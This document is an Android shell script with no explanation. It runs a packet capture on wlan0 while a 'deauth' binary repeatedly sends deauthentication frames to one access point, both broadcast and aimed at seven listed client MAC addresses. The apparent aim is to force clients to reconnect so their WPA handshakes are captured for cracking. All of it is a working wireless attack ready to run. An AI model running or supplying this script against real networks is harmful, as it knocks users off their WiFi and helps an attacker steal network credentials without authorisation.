#!/system/bin/sh
DUR=80
rm -f /data/local/tmp/capA.pcap
timeout $DUR tcpdump -i wlan0 -w /data/local/tmp/capA.pcap -s 0 >/dev/null 2>&1 &
TPID=$!
sleep 2
END=$(( $(date +%s) + $DUR ))
while [ $(date +%s) -lt $END ]; do
  /data/local/tmp/deauth wlan0 bc3e0701dc98 ffffffffffff 30 50 2>/dev/null
  for c in bc619323bc3f eabaa33b2316 a4ae1259ec61 d83add1c8344 38fdfec2111c 84b8b8fd1244 b2332a339a32; do
    /data/local/tmp/deauth wlan0 bc3e0701dc98 $c 15 60 2>/dev/null
  done
done
wait $TPID 2>/dev/null
wc -c /data/local/tmp/capA.pcap
echo CAPA_DONE
